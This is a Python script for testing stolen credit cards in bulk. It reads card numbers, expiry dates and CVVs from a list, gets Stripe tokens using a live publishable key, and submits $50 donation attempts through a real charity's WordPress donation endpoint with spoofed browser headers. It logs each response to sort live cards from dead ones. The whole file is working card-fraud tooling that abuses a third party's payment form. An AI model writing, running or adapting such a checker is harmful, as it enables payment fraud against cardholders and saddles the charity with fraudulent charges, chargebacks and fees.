#!/usr/bin/python
from urllib import response
import requests,json,sys,uuid,urllib3
urllib3.disable_warnings()
def funct(cc,mm,yy,cvv):
 print('[======> '+cc+' <======]')
 print('[+] Step 1 : Started ....')
 head1={
 'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
 'Pragma':'no-cache',
 'Accept':'*/*',
 }
 #response1 = requests.get('https://randomuser.me/api/1.2/?nat=us',headers=head1).json()
 #for x in response1['results']:
  #print('[*] Grab Random Info')
  #name=x['name']['first']
  #second=x['name']['last']
 #email=(name+second+'@outlook.com').lower()
 #fullname=name+' '+second
 #print('[-] first Name : '+name)
 #print('[-] last Name : '+second)
 #print('[-] Full Name : '+fullname)
 #print('[-] email : '+email)
 #print('[*] Successfully Grabbed :)')
 #print('[+] Step 2 : Started ....')
 head2={
 'Accept':'application/json',
 'Accept-Encoding':'gzip, deflate, br',
 'Accept-Language':'en-US,en;q=0.5',
 'Connection':'keep-alive',
 'Content-Length':'447',
 'Content-Type':'application/x-www-form-urlencoded',
 'Host':'api.stripe.com',
 'Origin':'https://js.stripe.com',
 'Referer':'https://js.stripe.com/',
 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0',
 }
 cookies2 = {'content-type':'application/x-www-form-urlencoded',}
 Guid=str(requests.post('https://m.stripe.com/4',headers=head1,cookies=cookies2).text)
 Muid=str(uuid.uuid1())
 Sid=str(uuid.uuid1())
 print('[-] Guid : '+Guid)
 print('[-] Muid : '+Muid)
 print('[-] Sid : '+Sid)
 print('[*] Successfully generated :)')
 print('[+] Step 3 : Started ....')
 data1={
 'type':"card",
 'billing_details[email]':'nomore@gmail.com',
 'billing_details[address][postal_code]':'10080',
 'card[number]':str(cc),
 'card[cvc]':str(cvv),
 'card[exp_month]':str(mm),
 'card[exp_year]':str(yy),
 'guid':(Guid),
 'muid':(Muid),
 'sid':(Sid),
 'payment_user_agent':'stripe.js/166410dc6;+stripe-js-v3//db46c9ed5',
 'time_on_page':'23770479',
 'key':'pk_live_QMBU860cL1m4otZJNXjcDFyq',
 }
 response2 = requests.post('https://api.stripe.com/v1/payment_methods',headers=head2,data=data1)
 nick=response2.json()
 
 print(response2.status_code)
 print('[*] Successfully Grabbed :)')
 if(response2.status_code == 200):
   id=str(nick['id'])
   print('[-] id :'+nick['id'])
 elif(response2.status_code == 402):
   print('tt generic error i guess but all error :')
   open('error.txt','a+').write(str(cc)+'|'+mm+'|'+yy+'|'+cvv+'|'+str(nick)+'\n')
   return CCList

     

 
 #if(nick["error"] == "code"):
  #print('error ' )
  #funct()
  #if (nick == ["id"]):
   #id=str(nick['id'])
   #print('[-] id :'+nick['id'])
   #print(+id)
  
  
 head3={
 'Accept':'application/json',
 'Accept-Encoding':'gzip, deflate, br',
 'Accept-Language':'en-US,en;q=0.5',
 'Connection':'keep-alive',
 'Content-Length':'447',
 'Content-Type':'application/x-www-form-urlencoded',
 'Host':'api.stripe.com',
 'Origin':'https://js.stripe.com',
 'Referer':'https://js.stripe.com/',
 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0',
 }
 data2={
 'card[number]':str(cc),
 'card[cvc]':str(cvv),
 'card[exp_month]':str(mm),
 'card[exp_year]':str(yy),
 'guid':(Guid),
 'muid':(Muid),
 'sid':(Sid),
 'payment_user_agent':'stripe.js/166410dc6;+stripe-js-v3/166410dc6',
 'time_on_page':'41968',
 'key':'pk_live_QMBU860cL1m4otZJNXjcDFyq',
 'pasted_fields':'number',
 }
 response3=requests.post('https://api.stripe.com/v1/tokens', headers=head3,data=data2)
 nick2=response3.json()
 id=str(nick2['id'])
 print('[-] id : '+id)
 print('[*] Successfully Grabbed :)')
 head4={
 'Accept':'*/*',
 'Accept-Encoding':'gzip,deflate,br',
 'Accept-Language':'en-US,en;q=0.5',
 'Connection':'keep-alive',
 'Content-Length':'1255',
 'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8',
 'Host':'hopeinlancaster.org',
 'Origin':'https://hopeinlancaster.org',
 'Referer':'https://hopeinlancaster.org/donations/',
 'Sec-Fetch-Dest':'empty',
 'Sec-Fetch-Mode':'cors',
 'Sec-Fetch-Site':'same-origin',
 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0',
 'X-Requested-With':'XMLHttpRequest',
 }
 data4={
 'action':"ds_process_button",
 'stripeToken':str(nick2['id']),
 'paymentMethodID':str(nick['id']),
 'allData[billingDetails][email]':'nomore@gmail.com',
 'type':"payment",
 'amount':'MTAwMA==',
 'params[value]':'ds-1550084928589',
 'params[name]':'HOPE+In+Lancaster,+Inc',
 'params[amount]':'NTAuMDA=',
 'params[description]':'$50.00+One-Time+Donation',
 'params[panellabel]':'Confirm+Payment',
 'params[type]':'payment',
 'params[coupon]':'',
 'params[setup_fee]':'""',
 'params[zero_decimal]':'""',
 'params[capture]':'1',
 'params[display_amount]':'1',
 'params[currency]':'USD',
 'params[locale]':'""',
 'params[success_query]':'',
 'params[error_query]':'',
 'params[success_url]':'https://hopeinlancaster.org/success',
 'params[error_url]':'https://hopeinlancaster.org/fail',
 'params[button_id]':'MyButton',
 'params[custom_role]':'""',
 'params[billing]':'""',
 'params[shipping]':'""',
 'params[rememberme]':'""',
 'params[key]':'pk_live_QMBU860cL1m4otZJNXjcDFyq',
 'params[current_email_address]':'',
 'params[ajaxurl]':"https://hopeinlancaster.org/wp-admin/admin-ajax.php",
 'params[image]':"https://www.hopeinlancaster.org/wp-content/uploads/2016/03/HOPE-LOGO.png",
 'params[instance]':"ds1550084928589",
 'params[ds_nonce]':"ecf13a9931",
 'ds_nonce':"ecf13a9931",
 'Cookie':"__stripe_mid=6cd7764b-a38c-436d-95e6-e32372e78e07ea6e57; et_bloom_optin_optin_1_1096420473_imp=true",
 }
 response4 = requests.post('https://hopeinlancaster.org/wp-admin/admin-ajax.php', data=data4,cookies=cookies2).json()
 

 print(response4)
 open('checked.txt','a+').write(str(cc)+'|'+mm+'|'+yy+'|'+cvv+'|'+str(response4)+'\n')
 #if (response4 ["message"] == "Your card was declined."):
  #open('bad.txt','a+').write(str(cc)+'|'+mm+'|'+yy+'|'+cvv+'\n')
  #print('[-] Result = -----:Your card was declined:---'+str(cc)+' ---:Dead:---  ')
 #elif (response4 ["message"] == "Your card's security code is incorrect"):
  # print('[-] Result = Your card security code is incorrect'+str(cc)+' ---:Dead:--- ')
   #open('inccorentcvv.txt','a+').write(str(cc)+'|'+mm+'|'+yy+'|'+cvv+'\n')
 #elif (response4 ["message"] =="card_error_authentication_required"):
 #print('[-] Result =   card_error_authentication_required'+str(cc)+'---live for ccn---')
 # open('bad.txt','a+').write(str+(cc)+'|'+mm+'|'+yy+'|'+cvv+'\n')
 #if (response4 ["url"] == "https://hopeinlancaster.org/fail"):
  #open('bad.txt','a+').write(str(cc)+'|'+mm+'|'+yy+'|'+cvv+'\n')
  #print('[-] Result = url-hopeinlancaster.org/fail'+str(cc)+'---:Dead:---' )
 #elif (response4 ["requires_source_action"]  == "True"):
  #   print('Dead')
 #else: 
  # print('[Vaild]:' +str(cc)+'accept' )
   #open('Accept.txt','a+').write(str(cc)+'|'+mm+'|'+yy+'|'+cvv+'\n')
 
CCList=open(input('CCs List : '),'r').read().splitlines()
for i in CCList:
 cc=i.split('|')[0]
 mm=i.split('|')[1]
 yy=i.split('|')[2]
 cvv=i.split('|')[3]
 funct(cc,mm,yy,cvv)
